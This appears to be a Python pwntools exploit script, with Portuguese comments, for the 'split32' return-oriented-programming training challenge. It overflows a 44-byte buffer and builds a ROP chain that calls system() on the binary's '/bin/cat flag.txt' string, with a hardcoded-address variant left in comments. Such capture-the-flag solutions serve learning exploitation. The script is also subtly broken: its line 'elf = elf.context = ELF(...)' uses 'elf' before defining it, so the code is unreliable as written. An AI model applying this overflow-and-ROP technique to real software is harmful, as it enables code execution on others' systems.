#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

elf = elf.context = ELF('split32')
p = process(elf.path)

### EXPLAINED ###
'''
Bom por enquanto está fácil
Podemos visualizar os símbolos com nm, syntax: nm split32
Vamos notar um símbolo chamada "usefulString"
Ele armazena a string /bin/cat flag.txt que passaremos para system() executar
Depois podemos encontrar o endereço da system usando o objdump, syntax: objdump -D -M intel split32 | grep system
Pegamos o gadget que dá call na system()

Poderia ficar aqui até amanhã falando como pegar de outra forma a string e o endereço da função
Tem diversas maneiras: r2, strings, etc, etc

Continuando...
Em arquitetura de 32 bits os argumento são passados via stack
Então chamamos a função, e parâmetro é o valor subsequente

1 - Estourar o buffer
2 - Call system()
3 - /bin/cat flag.txt
'''

# Using ROP Chain
rop = ROP(elf)
rop.raw(0x804861a) # system()
rop.raw(elf.symbols['usefulString'])

print(rop.dump())

xpl = flat(
	b'A' * 44,
	rop.chain()
)

'''
flag = 0x0804a030 # /bin/cat flag.txt
function = 0x0804861a # system()

xpl = b''
xpl += b'A' * 44
xpl += p32(function)
xpl += p32(flag)
'''

p.sendline(xpl)
p.interactive()
